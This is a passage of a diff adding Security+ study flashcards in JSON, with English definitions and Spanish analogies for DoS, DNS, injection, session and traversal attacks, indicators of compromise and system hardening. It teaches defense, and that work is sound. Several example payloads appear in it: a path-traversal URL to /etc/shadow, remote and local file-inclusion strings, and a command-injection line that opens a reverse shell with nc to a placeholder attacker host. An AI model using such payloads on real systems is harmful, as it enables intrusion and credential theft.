Indicator of Compromise — forensic clue suggesting a potential breach |\n| **Impossible Travel** | Logins from geographically incompatible locations within an impossible timeframe |\n| **Out-of-Cycle Logging** | Log activity at abnormal hours suggesting covert attacker operations |"
+      }
+    ],
+    "flashcards": [
+      {
+        "name": "Malicious Activity — Overview",
+        "definition": "A broad category of cyber threats where attackers use various techniques to disrupt systems, steal data, or gain unauthorized access to resources.",
+        "analogy": "*Es como estudiar todos los tipos de delitos antes de convertirte en detective. Si no sabes cómo opera un ladrón, un estafador o un vandalo, no puedes atraparlos ni proteger a nadie de ellos.*",
+        "raw_content": "* **Definition:** A broad category of cyber threats where attackers use various techniques to disrupt systems, steal data, or gain unauthorized access to resources.\n\nMalicious activity spans a wide range of attack types, each with distinct mechanisms and impacts. Understanding these attacks — including their **tactics, techniques, and procedures (TTPs)** — is the foundation of effective defense. This section maps to **Security+ Objective 2.4**: given a scenario, analyze indicators of malicious activity.\n\n> *Es como estudiar todos los tipos de delitos antes de convertirte en detective. Si no sabes cómo opera un ladrón, un estafador o un vandalo, no puedes atraparlos ni proteger a nadie de ellos.*\n\n---"
+      },
+      {
+        "name": "Denial of Service (DoS)",
+        "definition": "An attack category that attempts to make a computer, server, or network device unavailable to its intended users by overwhelming it with requests or exploiting vulnerabilities.",
+        "analogy": "*Es como bloquear la entrada de un restaurante con cientos de personas falsas que no van a ordenar nada — los clientes reales no pueden entrar.*",
+        "raw_content": "* **Definition:** An attack category that attempts to make a computer, server, or network device unavailable to its intended users by overwhelming it with requests or exploiting vulnerabilities.\n\nDoS is not a single attack but a **category** of attacks. The goal is always the same: deny legitimate users access to a service.\n\n> *Es como bloquear la entrada de un restaurante con cientos de personas falsas que no van a ordenar nada — los clientes reales no pueden entrar.*"
+      },
+      {
+        "name": "DoS: Flood Attacks",
+        "definition": "A DoS subtype that attempts to send more packets to a single server or host than it can handle, exhausting its resources.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A DoS subtype that attempts to send more packets to a single server or host than it can handle, exhausting its resources.\n\n**Ping Flood** — floods a target with ICMP echo request packets. Countermeasure: configure firewalls to drop ICMP echo replies.\n\n**SYN Flood** — attacker initiates many TCP sessions using spoofed IP addresses but never completes the three-way handshake, leaving the server waiting with reserved resources until they run out.\n\n| Countermeasure | How it helps |\n|---|---|\n| **Flood guards** | Detect and block SYN floods at the network boundary |\n| **Session timeout** | Server times out half-open connections after 10–30 seconds |\n| **IPS** | Detects and responds to SYN floods in progress |"
+      },
+      {
+        "name": "DoS: Permanent Denial of Service (PDoS)",
+        "definition": "An attack that permanently damages a networking device by overwriting or corrupting its firmware, requiring a full hardware reload to recover.",
+        "analogy": "*Como quemar el libro de instrucciones de una máquina — no es que esté apagada, es que ya no sabe cómo encenderse.*",
+        "raw_content": "* **Definition:** An attack that permanently damages a networking device by overwriting or corrupting its firmware, requiring a full hardware reload to recover.\n\nAlso called **phlashing**. A simple reboot will not restore the device because the OS/firmware itself has been destroyed.\n\n> *Como quemar el libro de instrucciones de una máquina — no es que esté apagada, es que ya no sabe cómo encenderse.*"
+      },
+      {
+        "name": "DoS: Fork Bomb",
+        "definition": "A DoS attack that creates a rapidly self-replicating number of processes to exhaust a system's CPU and memory resources.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A DoS attack that creates a rapidly self-replicating number of processes to exhaust a system's CPU and memory resources.\n\n⚠️ A fork bomb is **not a worm** — it does not spread across the network or infect other programs. It only spreads within the processor's cache of the targeted machine.\n\n---"
+      },
+      {
+        "name": "Distributed Denial of Service (DDoS)",
+        "definition": "A DoS attack that uses hundreds or thousands of compromised machines (a botnet) to simultaneously flood a single target, making it far more difficult to stop than a single-source attack.",
+        "analogy": "*Es como si un jefe del crimen controlara miles de personas en diferentes ciudades y les diera la orden de llamar al mismo número de teléfono al mismo tiempo — la línea colapsa y nadie más puede comunicarse.*",
+        "raw_content": "* **Definition:** A DoS attack that uses hundreds or thousands of compromised machines (a botnet) to simultaneously flood a single target, making it far more difficult to stop than a single-source attack.\n\nIndividual machines in the botnet (**zombies** or **bots**) typically don't know they're participating. They receive a command from a controller and all send packets to the victim simultaneously.\n\n> *Es como si un jefe del crimen controlara miles de personas en diferentes ciudades y les diera la orden de llamar al mismo número de teléfono al mismo tiempo — la línea colapsa y nadie más puede comunicarse.*"
+      },
+      {
+        "name": "DDoS: DNS Amplification Attack",
+        "definition": "A specialized DDoS where the attacker sends small DNS queries with the victim's spoofed IP address to open DNS servers, which reply with large responses — flooding the victim with amplified traffic.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A specialized DDoS where the attacker sends small DNS queries with the victim's spoofed IP address to open DNS servers, which reply with large responses — flooding the victim with amplified traffic.\n\nThe attack leverages the **size asymmetry** between a small DNS query and a large DNS response. Combined with a botnet, this generates massive traffic volumes quickly."
+      },
+      {
+        "name": "DNS Attacks",
+        "definition": "A category of attacks that target the Domain Name System to disrupt services, redirect traffic to malicious destinations, or expose network infrastructure information.",
+        "analogy": "*El DNS es como la guía telefónica de internet. Si alguien la falsifica, envenena o roba, puede redirigir a todas las personas al lugar equivocado sin que se den cuenta.*",
+        "raw_content": "* **Definition:** A category of attacks that target the Domain Name System to disrupt services, redirect traffic to malicious destinations, or expose network infrastructure information.\n\nDNS is a critical internet component and a prime attack surface. There are five main DNS attack types to know.\n\n> *El DNS es como la guía telefónica de internet. Si alguien la falsifica, envenena o roba, puede redirigir a todas las personas al lugar equivocado sin que se den cuenta.*"
+      },
+      {
+        "name": "DNS: Cache Poisoning",
+        "definition": "An attack that corrupts a DNS resolver's cache with false records, redirecting users to attacker-controlled IP addresses instead of the legitimate destination. Also called DNS spoofing.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An attack that corrupts a DNS resolver's cache with false records, redirecting users to attacker-controlled IP addresses instead of the legitimate destination. Also called DNS spoofing.\n\n**Mitigation:** Use **DNSSEC** (DNS Security Extensions) to add digital signatures to DNS records, verifying authenticity and integrity during lookups."
+      },
+      {
+        "name": "DNS: Amplification Attack",
+        "definition": "A DDoS-style attack where the attacker sends small DNS queries with the victim's spoofed IP to open resolvers, which send large responses to the victim, overwhelming it with traffic.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A DDoS-style attack where the attacker sends small DNS queries with the victim's spoofed IP to open resolvers, which send large responses to the victim, overwhelming it with traffic.\n\n**Mitigation:** Rate-limit DNS response traffic and limit the size of DNS responses."
+      },
+      {
+        "name": "DNS: Tunneling",
+        "definition": "An attack technique that encapsulates non-DNS traffic (such as HTTP or SSH) inside DNS queries and responses over port 53 to bypass firewall rules for command-and-control (C2) or data exfiltration.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An attack technique that encapsulates non-DNS traffic (such as HTTP or SSH) inside DNS queries and responses over port 53 to bypass firewall rules for command-and-control (C2) or data exfiltration.\n\nDNS traffic is often allowed through firewalls without inspection, making this technique effective. DNS tunneling is a legitimate protocol feature that attackers exploit.\n\n**Mitigation:** Monitor and analyze DNS logs for unusual patterns such as abnormally long queries, high query frequency, or unusual domain names."
+      },
+      {
+        "name": "DNS: Domain Hijacking",
+        "definition": "An attack where the registration of a domain name is changed without the permission of the legitimate registrant, giving the attacker control over the domain and its traffic. Also called domain theft.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An attack where the registration of a domain name is changed without the permission of the legitimate registrant, giving the attacker control over the domain and its traffic. Also called domain theft.\n\n**Mitigation:** Use **domain registry lock services** to prevent unauthorized changes; regularly update and secure registrar account credentials."
+      },
+      {
+        "name": "DNS: Zone Transfer Attack",
+        "definition": "An attack where the attacker impersonates an authorized system to request a full copy of a DNS zone file, exposing all DNS records and network infrastructure details for use in future reconnaissance.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An attack where the attacker impersonates an authorized system to request a full copy of a DNS zone file, exposing all DNS records and network infrastructure details for use in future reconnaissance.\n\n⚠️ Zone transfer data reveals the full map of a network's DNS structure — a goldmine for pre-attack reconnaissance.\n\n---"
+      },
+      {
+        "name": "Directory Traversal Attack",
+        "definition": "An injection attack that exploits insufficient input validation in a web application to access files and directories outside the intended web document root, potentially reaching sensitive system files.",
+        "analogy": "*Es como estar en un hotel y descubrir que, en vez de usar el elevador normal, puedes subir por las escaleras de servicio y entrar a cualquier habitación — incluyendo la oficina del gerente donde están las llaves maestras.*",
+        "raw_content": "* **Definition:** An injection attack that exploits insufficient input validation in a web application to access files and directories outside the intended web document root, potentially reaching sensitive system files.\n\nAlso called a **path traversal** attack. If a web server runs on Linux, the attack uses `../` sequences in a URL to navigate up the directory tree. On Windows/IIS systems, `..\\ ` (backslash) is used, though Windows often accepts both.\n\n> *Es como estar en un hotel y descubrir que, en vez de usar el elevador normal, puedes subir por las escaleras de servicio y entrar a cualquier habitación — incluyendo la oficina del gerente donde están las llaves maestras.*\n\n**Example URL:**\n```\nhttps://diontraining.com/../../../../etc/shadow\n```\nEach `../` moves one level up the directory tree until reaching the system root, then navigates to the `/etc/shadow` file containing Linux password hashes.\n\n⚠️ Attackers may **encode** traversal sequences to bypass security filters:\n- `../` can be encoded as `%2e%2e%2f`"
+      },
+      {
+        "name": "Directory Traversal: File Inclusion",
+        "definition": "A web application vulnerability that allows an attacker to either download arbitrary files from the host system (via directory traversal) or upload and execute malicious scripts to establish a backdoor.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A web application vulnerability that allows an attacker to either download arbitrary files from the host system (via directory traversal) or upload and execute malicious scripts to establish a backdoor.\n\n**Remote File Inclusion (RFI)** — attacker injects a URL pointing to a remote malicious script as a parameter value, causing the server to fetch and execute the attacker's code.\n\n```\nhttps://diontraining.com/login.php?user=http://malware.bad/malicious.php\n```\n\n**Local File Inclusion (LFI)** — attacker references a file already on the server (e.g., a previously uploaded file) and uses directory traversal to execute it.\n\n```\nhttps://diontraining.com/login.php?user=../../Windows/system32/cmd.exe%00\n```\nThe `%00` is a **null byte** that terminates the string, bypassing filters that would otherwise append `.php` to the request.\n\n⚠️ **Exam tip:** Anytime you see `../` in a URL or log — think **directory traversal**. If the answer choices include both \"directory traversal\" and \"local file inclusion,\" LFI is a subtype of directory traversal.\n\n---"
+      },
+      {
+        "name": "Execution and Escalation Attacks",
+        "definition": "A class of attacks that exploit vulnerabilities to run unauthorized code on a system, or to gain higher levels of system privilege than originally granted.",
+        "analogy": "*Es como entrar a un edificio con un pase de visitante y, usando trucos, conseguir la llave maestra que abre todos los pisos — incluyendo el de servidores en el sótano.*",
+        "raw_content": "* **Definition:** A class of attacks that exploit vulnerabilities to run unauthorized code on a system, or to gain higher levels of system privilege than originally granted.\n\n> *Es como entrar a un edificio con un pase de visitante y, usando trucos, conseguir la llave maestra que abre todos los pisos — incluyendo el de servidores en el sótano.*"
+      },
+      {
+        "name": "Arbitrary Code Execution (ACE)",
+        "definition": "A vulnerability that allows an attacker to run any code they choose on a target system by exploiting a flaw in an application or process.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A vulnerability that allows an attacker to run any code they choose on a target system by exploiting a flaw in an application or process."
+      },
+      {
+        "name": "Remote Code Execution (RCE)",
+        "definition": "A subtype of arbitrary code execution where the attacker transmits and executes malicious code on a target system from a remote host over a network.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A subtype of arbitrary code execution where the attacker transmits and executes malicious code on a target system from a remote host over a network.\n\n⚠️ **ACE vs RCE:** ACE = attacker can run code on the machine (any vector, touching the target machine). RCE = ACE done **remotely** over the internet. RCE is a specific, more dangerous subset of ACE."
+      },
+      {
+        "name": "Privilege Escalation",
+        "definition": "An attack where a user or process gains access to resources or permissions beyond what they are normally entitled to, typically aiming for administrator or root-level access.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An attack where a user or process gains access to resources or permissions beyond what they are normally entitled to, typically aiming for administrator or root-level access.\n\n| Type | Description | Example |\n|---|---|---|\n| **Vertical Privilege Escalation** | Moving from a lower-privilege user to a higher-privilege level (user → admin/root) | Clicking a phishing link that runs code granting local admin rights |\n| **Horizontal Privilege Escalation** | Accessing resources of another user at the same privilege level | Exploiting a vulnerability to read or modify George's files without his permission |\n\nEvery process runs under some account's privileges. Code injected into a process **inherits the privileges of that process** — making high-privilege processes prime targets."
+      },
+      {
+        "name": "Rootkits",
+        "definition": "A class of malware that modifies system files — often at the kernel level — to conceal its presence and maintain persistent, stealthy access to a compromised system.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A class of malware that modifies system files — often at the kernel level — to conceal its presence and maintain persistent, stealthy access to a compromised system.\n\nRootkits are difficult to detect because they can hide themselves, install additional malware, and maintain persistence across reboots and user logoffs.\n\nRootkits operate at different privilege **rings**:\n\n| Ring | Level | Description |\n|---|---|---|\n| **Ring 0** | Kernel mode | Most privileged; full control over the OS |\n| **Ring 1–2** | Driver mode | Device driver level access |\n| **Ring 3** | User mode | Application level; least privileged |\n\n**Kernel mode rootkit** — embeds at Ring 0; complete system control; most dangerous.\n\n**User mode rootkit** — operates at Ring 3 with admin-level privileges; uses OS features (registry, Task Scheduler) for persistence; easier to detect and remove.\n\n---"
+      },
+      {
+        "name": "Replay Attacks",
+        "definition": "A network attack where a valid data transmission (such as authentication credentials) is intercepted and then maliciously retransmitted later to gain unauthorized access.",
+        "analogy": "*Es como grabar la combinación que alguien marca en una caja fuerte y luego, cuando se va, marcar tú mismo la misma combinación para abrirla — sin necesidad de saber qué número es cada tono.*",
+        "raw_content": "* **Definition:** A network attack where a valid data transmission (such as authentication credentials) is intercepted and then maliciously retransmitted later to gain unauthorized access.\n\nThe attacker does not need to crack or decrypt the captured data — they simply **replay** the original valid session to the server, which accepts it as legitimate.\n\n> *Es como grabar la combinación que alguien marca en una caja fuerte y luego, cuando se va, marcar tú mismo la misma combinación para abrirla — sin necesidad de saber qué número es cada tono.*\n\n**Example:** An attacker captures your bank login session and replays it hours later to authenticate as you.\n\n| Mitigation | How it helps |\n|---|---|\n| **Session tokens** | Unique per-session tokens make replaying an old session invalid |\n| **Multi-Factor Authentication (MFA)** | OTP codes expire every 30–60 seconds; captured codes cannot be reused |\n| **WPA3** | Modern Wi-Fi encryption protocol resistant to replay attacks |\n\n⚠️ **Replay vs Session Hijacking:** In a replay attack the attacker retransmits captured data later. In session hijacking the attacker modifies data in real time during an active session.\n\n---"
+      },
+      {
+        "name": "Session Hijacking",
+        "definition": "A spoofing attack where the attacker steals or forges a user's active session token (often via cookie theft) to impersonate that user and take over their authenticated session.",
+        "analogy": "*Es como robarle el brazalete de acceso a alguien en un festival de música. Nadie en la entrada sabe quién eres — solo ven el brazalete y te dejan pasar.*",
+        "raw_content": "* **Definition:** A spoofing attack where the attacker steals or forges a user's active session token (often via cookie theft) to impersonate that user and take over their authenticated session.\n\nHTTP is a **stateless protocol** — servers don't remember clients between requests. **Cookies** solve this by storing session state. Because cookies are transmitted with every request, stealing them allows an attacker to impersonate the legitimate user.\n\n> *Es como robarle el brazalete de acceso a alguien en un festival de música. Nadie en la entrada sabe quién eres — solo ven el brazalete y te dejan pasar.*\n\n**Cookie types:**\n\n| Type | Storage | Lifespan |\n|---|---|---|\n| **Session cookies** | Memory only | Deleted when browser closes |\n| **Persistent cookies** | Browser cache | Until manually cleared or expiration date |"
+      },
+      {
+        "name": "Session Hijacking: Session Prediction",
+        "definition": "A session hijacking technique where the attacker attempts to predict the next valid session token by analyzing patterns in how tokens are generated, then uses the predicted token to take over a session.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A session hijacking technique where the attacker attempts to predict the next valid session token by analyzing patterns in how tokens are generated, then uses the predicted token to take over a session.\n\nTokens must be generated by a **non-predictable algorithm** and must not reveal any information about the client or session."
+      },
+      {
+        "name": "Session Hijacking: Cookie Poisoning",
+        "definition": "An attack where the contents of a cookie are modified after it has been issued by the web server, exploiting the altered values to trigger vulnerabilities in the web application.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An attack where the contents of a cookie are modified after it has been issued by the web server, exploiting the altered values to trigger vulnerabilities in the web application.\n\n**Mitigations for cookie security:**\n- Encrypt cookies during transmission and storage\n- Validate all cookie input server-side\n- Delete cookies when the session ends\n- Set strict expiration times\n\n---"
+      },
+      {
+        "name": "On-Path Attacks",
+        "definition": "An attack where the attacker positions themselves logically between two communicating hosts to transparently capture, monitor, and optionally modify or relay the traffic between them. Formerly called Man-in-the-Middle (MitM).",
+        "analogy": "*Es como un cartero corrupto que abre todas tus cartas antes de entregarlas, lee el contenido, puede modificarlo, y luego las sella de nuevo como si nada hubiera pasado.*",
+        "raw_content": "* **Definition:** An attack where the attacker positions themselves logically between two communicating hosts to transparently capture, monitor, and optionally modify or relay the traffic between them. Formerly called Man-in-the-Middle (MitM).\n\nCommon methods to achieve an on-path position include: **ARP poisoning**, **DNS poisoning**, rogue wireless access points, and rogue hub/switches.\n\n> *Es como un cartero corrupto que abre todas tus cartas antes de entregarlas, lee el contenido, puede modificarlo, y luego las sella de nuevo como si nada hubiera pasado.*\n\n**Replay** (in on-path context) — attacker captures valid data and retransmits it immediately or after a delay to authenticate to a service.\n\n**Relay** — attacker inserts themselves as a transparent proxy between client and server, reading and optionally modifying all traffic in real time."
+      },
+      {
+        "name": "On-Path: SSL Stripping",
+        "definition": "An on-path technique that downgrades a victim's HTTPS connection to plain HTTP by intercepting the initial request and presenting the client with an unencrypted connection, allowing the attacker to read all traffic in cleartext.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An on-path technique that downgrades a victim's HTTPS connection to plain HTTP by intercepting the initial request and presenting the client with an unencrypted connection, allowing the attacker to read all traffic in cleartext.\n\nThe victim's browser shows no padlock and the communication is unencrypted, enabling full data interception."
+      },
+      {
+        "name": "On-Path: Downgrade Attack",
+        "definition": "An on-path technique that forces a client or server to negotiate a lower, weaker security protocol version (e.g., SSL 2.0 instead of TLS 1.3), making it easier for the attacker to decrypt or crack the intercepted traffic.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An on-path technique that forces a client or server to negotiate a lower, weaker security protocol version (e.g., SSL 2.0 instead of TLS 1.3), making it easier for the attacker to decrypt or crack the intercepted traffic.\n\n⚠️ Downgrade attacks apply beyond SSL/TLS — they can target any negotiated security protocol including Wi-Fi and VPNs. The key is exploiting **backwards compatibility** between protocol versions.\n\n---"
+      },
+      {
+        "name": "Injection Attacks",
+        "definition": "A broad class of attacks where an attacker inserts malicious input through an application interface, causing the application to execute unintended commands or queries.",
+        "analogy": "*Es como escribir instrucciones falsas en un formulario oficial — si el sistema no valida lo que recibe, ejecuta tus órdenes como si fueran legítimas.*",
+        "raw_content": "* **Definition:** A broad class of attacks where an attacker inserts malicious input through an application interface, causing the application to execute unintended commands or queries.\n\n> *Es como escribir instrucciones falsas en un formulario oficial — si el sistema no valida lo que recibe, ejecuta tus órdenes como si fueran legítimas.*"
+      },
+      {
+        "name": "Injection: LDAP Injection",
+        "definition": "An application attack that targets web applications using LDAP (Lightweight Directory Access Protocol) by injecting malicious LDAP queries through user input fields to manipulate directory lookups, bypass authentication, or expose directory data.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An application attack that targets web applications using LDAP (Lightweight Directory Access Protocol) by injecting malicious LDAP queries through user input fields to manipulate directory lookups, bypass authentication, or expose directory data.\n\nLDAP is commonly used for authentication and storing user/group information. Injecting a wildcard (`*`) into an unsanitized LDAP query can return all users in the directory.\n\n**Mitigation:** Input validation and input sanitization — same principle as SQL injection prevention."
+      },
+      {
+        "name": "Injection: Command Injection",
+        "definition": "An attack where a threat actor appends shell commands to user-supplied input in a vulnerable web application, causing the server to execute those commands with the web server's own privileges.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An attack where a threat actor appends shell commands to user-supplied input in a vulnerable web application, causing the server to execute those commands with the web server's own privileges.\n\n**Example:** A web app accepts an IP address and runs `ping [input]`. If an attacker enters:\n```\ndiontraining.com && /bin/sh -i nc hacked.diontraining.com 443\n```\nThe server executes both the ping AND opens a reverse shell to the attacker.\n\n**Mitigation:** Strict input validation — only accept the expected format (e.g., valid IP addresses or domain names) and reject or strip anything else."
+      },
+      {
+        "name": "Injection: Process Injection",
+        "definition": "A technique where an attacker executes arbitrary code within the memory space of a legitimate, already-running process to inherit that process's permissions and evade security detection.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A technique where an attacker executes arbitrary code within the memory space of a legitimate, already-running process to inherit that process's permissions and evade security detection.\n\nBecause the malicious code runs **under a trusted process**, security tools may not flag it. Execution is masked as normal process activity.\n\nCommon process injection methods include: DLL injection, thread execution hijacking, process hollowing, process doppelgänging, asynchronous procedure calls (APC), and portable execution (PE) injection.\n\n**Mitigation:** Endpoint security solutions blocking common attack sequences, security kernel modules, and the principle of **least privilege**.\n\n---"
+      },
+      {
+        "name": "Indicators of Compromise (IoC)",
+        "definition": "Pieces of forensic data that identify potentially malicious activity on a network or system, serving as digital evidence that a security breach may have occurred.",
+        "analogy": "*Son como las huellas de barro en el pasillo de un museo después de que cierra. No confirman que alguien robó algo — pero definitivamente indican que hay que investigar quién entró y por qué.*",
+        "raw_content": "* **Definition:** Pieces of forensic data that identify potentially malicious activity on a network or system, serving as digital evidence that a security breach may have occurred.\n\nIoCs are clues, not proof. A detected IoC requires investigation to determine whether it represents a true compromise, a system error, legitimate user activity, or a false positive.\n\n> *Son como las huellas de barro en el pasillo de un museo después de que cierra. No confirman que alguien robó algo — pero definitivamente indican que hay que investigar quién entró y por qué.*"
+      },
+      {
+        "name": "IoC: Account Lockouts",
+        "definition": "An IoC that occurs when an account is locked after multiple failed login attempts, potentially indicating a brute force attack attempting to guess credentials.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An IoC that occurs when an account is locked after multiple failed login attempts, potentially indicating a brute force attack attempting to guess credentials.\n\nLockout policies balance security and usability — too strict (e.g., 3 attempts) causes false positives for legitimate users who mistype. Some systems auto-unlock after a timeout; high-security systems require manual admin intervention."
+      },
+      {
+        "name": "IoC: Concurrent Session Usage",
+        "definition": "An IoC where multiple active sessions exist simultaneously for a single user account, potentially indicating the account has been compromised and is being used by both the legitimate user and an attacker.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An IoC where multiple active sessions exist simultaneously for a single user account, potentially indicating the account has been compromised and is being used by both the legitimate user and an attacker.\n\n⚠️ Could be a false positive (e.g., user logged in from phone and laptop). Becomes highly suspicious when combined with **impossible travel** — one session in the US, another in Europe at the same time."
+      },
+      {
+        "name": "IoC: Blocked Content",
+        "definition": "An IoC consisting of repeated attempts to access or download content that has been blocked by security controls, potentially indicating a compromised account being used for data exfiltration or malware download.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An IoC consisting of repeated attempts to access or download content that has been blocked by security controls, potentially indicating a compromised account being used for data exfiltration or malware download."
+      },
+      {
+        "name": "IoC: Impossible Travel",
+        "definition": "An IoC that flags authentication events from geographically distant locations within a timeframe that makes physical travel between those locations impossible, strongly indicating credential compromise.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An IoC that flags authentication events from geographically distant locations within a timeframe that makes physical travel between those locations impossible, strongly indicating credential compromise.\n\n**Example:** Login from New York at 9:00 AM, then login from London at 10:00 AM. A transatlantic flight takes 6+ hours — this is physically impossible.\n\n⚠️ Often appears together with concurrent session usage as both can occur simultaneously during an active account compromise."
+      },
+      {
+        "name": "IoC: Resource Consumption",
+        "definition": "An IoC characterized by unusual spikes in CPU, memory, GPU, or network bandwidth utilization, potentially indicating malware infection, DDoS participation, or cryptomining activity.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An IoC characterized by unusual spikes in CPU, memory, GPU, or network bandwidth utilization, potentially indicating malware infection, DDoS participation, or cryptomining activity.\n\n**Example:** A server normally at 20% CPU suddenly jumps to 90%. A workstation with 90% GPU usage while browsing may be enrolled as a **crypto mining zombie**."
+      },
+      {
+        "name": "IoC: Resource Inaccessibility",
+        "definition": "An IoC where users suddenly cannot access files, databases, or network services — commonly associated with ransomware attacks that encrypt victim data and demand payment for decryption.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An IoC where users suddenly cannot access files, databases, or network services — commonly associated with ransomware attacks that encrypt victim data and demand payment for decryption.\n\nThe clearest sign: users receive a **ransom note** alongside inaccessible files."
+      },
+      {
+        "name": "IoC: Out-of-Cycle Logging",
+        "definition": "An IoC consisting of log entries at unusual times (late nights, weekends, holidays) when no legitimate activity is expected, potentially indicating an attacker operating during off-hours to avoid detection.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An IoC consisting of log entries at unusual times (late nights, weekends, holidays) when no legitimate activity is expected, potentially indicating an attacker operating during off-hours to avoid detection.\n\n**Example:** Log activity at 3:00 AM in an office that closes at 6:00 PM."
+      },
+      {
+        "name": "IoC: Missing Logs",
+        "definition": "An IoC where system logs show unexplained gaps of hours or days, potentially indicating an attacker has deleted log entries to erase evidence of their activity and impede forensic investigation.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An IoC where system logs show unexplained gaps of hours or days, potentially indicating an attacker has deleted log entries to erase evidence of their activity and impede forensic investigation.\n\n⚠️ Attackers routinely delete logs as a **covering tracks** technique. Missing logs are itself strong evidence something malicious occurred."
+      },
+      {
+        "name": "IoC: Published/Defacement Notifications",
+        "definition": "An IoC where an attacker publicly announces or demonstrates that they have compromised an organization's systems — through website defacement, social media posts, hacker forums, or news articles.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An IoC where an attacker publicly announces or demonstrates that they have compromised an organization's systems — through website defacement, social media posts, hacker forums, or news articles.\n\n**Example:** A company's homepage is replaced with a message from a hacktivist group claiming responsibility for the breach.\n\n---"
+      }
+    ]
+  },
+  {
+    "sectionId": "S20",
+    "sectionTitle": "Section 20: Hardening",
+    "concepts": [
+      {
+        "name": "Hardening",
+        "definition": "The process of enhancing the security of a system, application, or network by implementing measures and configurations that reduce its exposure to vulnerabilities and potential threats.",
+        "analogy": "*Es como preparar una casa para un huracán: no esperas a que llegue la tormenta para atrancar las ventanas. Refuerzas todo antes, cierras lo que no se necesita y te aseguras de que cada entrada esté bien protegida.*",
+        "tables": [],
+        "list_items": [],
+        "raw_content": "* **Definition:** The process of enhancing the security of a system, application, or network by implementing measures and configurations that reduce its exposure to vulnerabilities and potential threats.\n\nHardening involves applying security patches, configuring access controls, disabling unnecessary services, and adopting best practices to strengthen the overall **security posture** and resilience against cyber attacks.\n\n> *Es como preparar una casa para un huracán: no esperas a que llegue la tormenta para atrancar las ventanas. Refuerzas todo antes, cierras lo que no se necesita y te aseguras de que cada entrada esté bien protegida.*\n\nHardening applies across the full stack: operating systems, applications, network devices, cloud instances, and firmware.\n\n---"
+      },
+      {
+        "name": "Changing Default Configurations",
+        "definition": "The process of modifying factory-set configurations on hardware and software — including default credentials, open ports, and unneeded protocols — to eliminate known, publicly documented security weaknesses.",
+        "analogy": "*Es como comprar una cerradura nueva que viene con una llave maestra publicada en el manual del fabricante. Mientras no cambies esa llave, cualquier persona que haya leído el manual puede entrar a tu casa.*",
+        "tables": [
+          {
+            "headers": [
+              "Port",
+              "Protocol",
+              "Action"
+            ],
+            "rows": [
+              [
+                "22",
+                "SSH",
+                "Keep — secure remote access"
+              ],
+              [
+                "23",
+                "Telnet",
+                "**Close** — sends data unencrypted"
+              ],
+              [
+                "80",
+                "HTTP",
+                "**Close** if only HTTPS is needed"
+              ],
+              [
+                "443",
+                "HTTPS",
+                "Keep — encrypted web communications"
+              ]
+            ]
+          }
+        ],
+        "list_items": [
+          "Change default credentials **immediately** upon first power-on.",
+          "Enable **multi-factor authentication** in the administrative dashboard if supported.",
+          "Use a **long, strong, unique, and complex password** — managed via a password manager.",
+          "Rotate administrative passwords approximately **every 90 days**.",
+          "Where a secure encrypted version exists, migrate to it:",
+          "HTTP (port 80) → **HTTPS (port 443)**",
+          "SMTP (port 25) → **SMTPS (port 587 or 465)**"
+        ],
+        "raw_content": "* **Definition:** The process of modifying factory-set configurations on hardware and software — including default credentials, open ports, and unneeded protocols — to eliminate known, publicly documented security weaknesses.\n\nWhen a new device or piece of software is installed, its factory settings prioritize ease of use over security. These defaults are often documented in manuals and online knowledge bases, making them trivially exploitable by attackers.\n\n> *Es como comprar una cerradura nueva que viene con una llave maestra publicada en el manual del fabricante. Mientras no cambies esa llave, cualquier persona que haya leído el manual puede entrar a tu casa.*\n\n### Default Passwords\n\nDefault credentials are preset authentication details provided by manufacturers for initial device access. Common combinations include `admin/admin`, `administrator/password`, or `admin/<blank>`.\n\n- Change default credentials **immediately** upon first power-on.\n- Enable **multi-factor authentication** in the administrative dashboard if supported.\n- Use a **long, strong, unique, and complex password** — managed via a password manager.\n- Rotate administrative passwords approximately **every 90 days**.\n\n### Unneeded Ports and Protocols\n\nEvery active open port is a potential entry point for an attacker. Conduct a thorough audit and disable all ports and protocols not required for your operational needs.\n\n- Where a secure encrypted version exists, migrate to it:\n  - HTTP (port 80) → **HTTPS (port 443)**\n  - SMTP (port 25) → **SMTPS (port 587 or 465)**\n\n### Excessive Open Ports\n\nDevices often ship with multiple ports open for maximum compatibility, including both secure and insecure versions of the same service:\n\n| Port | Protocol | Action                              |\n| ---- | -------- | ----------------------------------- |\n| 22   | SSH      | Keep — secure remote access         |\n| 23   | Telnet   | **Close** — sends data unencrypted  |\n| 80   | HTTP     | **Close** if only HTTPS is needed   |\n| 443  | HTTPS    | Keep — encrypted web communications |\n\n⚠️ **Exam Tip:** Being proactive with default configurations is your first and most formidable line of defense. Simple steps like changing a password or closing a port can prevent attacks that exploit well-known default settings.\n\n---"
+      },
+      {
+        "name": "Restricting Applications — Least Functionality",
+        "definition": "The principle of configuring a workstation or server to provide only the essential applications and services required by that user, minimizing the attack surface introduced by unnecessary code.",
+        "analogy": "*Es como un restaurante que solo sirve los platos del menú. Si el cocinero solo tiene los ingredientes necesarios para esas recetas, hay mucho menos riesgo de que aparezca algo inesperado o dañino en la cocina.*",
+        "tables": [
+          {
+            "headers": [
+              "Method",
+              "Default State",
